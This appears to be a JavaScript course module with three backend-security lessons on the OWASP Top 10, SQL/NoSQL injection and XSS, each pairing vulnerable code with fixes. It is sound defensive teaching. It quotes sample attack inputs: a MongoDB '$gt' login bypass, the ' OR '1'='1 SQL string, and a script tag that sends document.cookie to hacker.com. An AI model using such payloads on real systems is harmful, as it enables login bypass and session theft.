module.exports = {
  title: "Module 1: Vulnerabilities & Injection",
  description: "Understanding the OWASP Top 10 and preventing injection attacks.",
  order: 1,
  lessons: [
    {
      title: "Common Backend Security Vulnerabilities",
      slug: "common-vulnerabilities",
      order: 1,
      estimatedMinutes: 30,
      content: `# Common Backend Security Vulnerabilities

**Learning objectives:**
- Understand the OWASP Top 10
- Identify the most common backend security risks
- Learn the principle of "Defense in Depth"

## What is OWASP?
The **Open Worldwide Application Security Project (OWASP)** is a nonprofit foundation that works to improve the security of software. Every few years, they publish the "OWASP Top 10" — the most critical security risks to web applications.

## The OWASP Top 10 (Simplified)
1. **Broken Access Control**: Users accessing data they shouldn't (e.g., changing a URL from \`/user/1\` to \`/user/2\`).
2. **Cryptographic Failures**: Storing plain-text passwords or using weak encryption.
3. **Injection**: Sending malicious commands (SQL, NoSQL, OS) through unvalidated input.
4. **Insecure Design**: Flaws in the logic of the application.
5. **Security Misconfiguration**: Leaving default passwords active, exposing stack traces.
6. **Vulnerable Components**: Using outdated npm packages with known bugs.
7. **Authentication Failures**: Weak passwords, missing rate limits, session hijacking.
8. **Data Integrity Failures**: Trusting data from untrusted sources (like insecure webhooks).
9. **Logging Failures**: Not logging critical events, or logging sensitive data.
10. **Server-Side Request Forgery (SSRF)**: Tricking the server into making requests to internal services.

## Defense in Depth
Never rely on a single layer of security. If your authentication is strong but your database allows injection, you're still vulnerable.

## Key Takeaways
- Security is not a feature; it's a requirement.
- Most attacks exploit unvalidated user input.
- Always assume the client is malicious.`
    },
    {
      title: "Preventing SQL and NoSQL Injection",
      slug: "injection-prevention",
      order: 2,
      estimatedMinutes: 35,
      content: `# Preventing SQL and NoSQL Injection

**Learning objectives:**
- Understand how injection attacks work
- Prevent NoSQL injection in MongoDB
- Prevent SQL injection in relational databases

## What is Injection?
Injection occurs when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands.

## NoSQL Injection (MongoDB)
If you blindly use user input in a MongoDB query, you can be exploited.

### ❌ The Vulnerability
\`\`\`javascript
// User input: { "email": { "$gt": "" }, "password": { "$gt": "" } }
const user = await User.findOne({ 
  email: req.body.email, 
  password: req.body.password 
});
\`\`\`
If an attacker sends \`{"$gt": ""}\` as the email, MongoDB interprets it as "email greater than empty string" (which matches the first user). This bypasses login entirely.

### ✅ The Fix: Sanitize Inputs
Ensure inputs are strings, not objects.

\`\`\`javascript
if (typeof req.body.email !== 'string' || typeof req.body.password !== 'string') {
  return res.status(400).json({ error: "Invalid input type" });
}
\`\`\`
Or use a library like \`express-mongo-sanitize\` which strips out keys starting with \`$\` or containing \`.\`.

## SQL Injection
If you write raw SQL using string concatenation, you are vulnerable.

### ❌ The Vulnerability
\`\`\`javascript
const query = \`SELECT * FROM users WHERE email = '\${req.body.email}'\`;
\`\`\`
If the attacker enters \`' OR '1'='1\`, the query becomes:
\`\`\`sql
SELECT * FROM users WHERE email = '' OR '1'='1'
\`\`\`
This returns all users.

### ✅ The Fix: Parameterized Queries
Never concatenate strings. Use parameters.

\`\`\`javascript
const query = 'SELECT * FROM users WHERE email = ?';
db.execute(query, [req.body.email]);
\`\`\`
The database treats the input strictly as data, not as executable code.

## Key Takeaways
- Never trust raw user input.
- NoSQL: Sanitize inputs so they cannot be objects.
- SQL: Always use parameterized queries or an ORM.`
    },
    {
      title: "Cross-Site Scripting (XSS) Prevention",
      slug: "xss-prevention",
      order: 3,
      estimatedMinutes: 35,
      content: `# Cross-Site Scripting (XSS) Prevention

**Learning objectives:**
- Understand how XSS attacks work
- Prevent XSS by escaping output
- Use Content Security Policy (CSP)

## What is XSS?
XSS occurs when an attacker injects malicious JavaScript into a web page viewed by other users.

## The Attack
1. A user posts a comment: \`<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>\`
2. Your server saves this to the database.
3. Another user views the page.
4. The browser executes the script, sending the user's session token to the attacker.

## Types of XSS
- **Stored XSS**: The malicious script is saved in the database (as above).
- **Reflected XSS**: The script is part of the URL and reflects back to the user.
- **DOM-based XSS**: The vulnerability is in the client-side JavaScript.

## Prevention: Escaping
**Never trust user input when rendering it.**
If you use React, Angular, or Vue, they escape by default.

In plain HTML/JS, avoid using \`innerHTML\` with user data:

### ❌ Vulnerable
\`\`\`javascript
document.getElementById('comment').innerHTML = userInput;
\`\`\`

### ✅ Safe
\`\`\`javascript
document.getElementById('comment').textContent = userInput;
\`\`\`

## Escaping Helper Function
If you must inject dynamic HTML, escape the characters:
\`\`\`javascript
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}
\`\`\`

## Content Security Policy (CSP)
CSP is an HTTP header that tells the browser which sources of JavaScript are allowed.
\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self' trusted.com
\`\`\`
Even if an attacker injects a script, the browser will refuse to execute it if the source isn't in the whitelist.

## Key Takeaways
- XSS is about executing untrusted JavaScript.
- Always escape output, especially HTML.
- Use \`textContent\` instead of \`innerHTML\`.
- Use CSP as a defense-in-depth mechanism.`
    }
  ]
};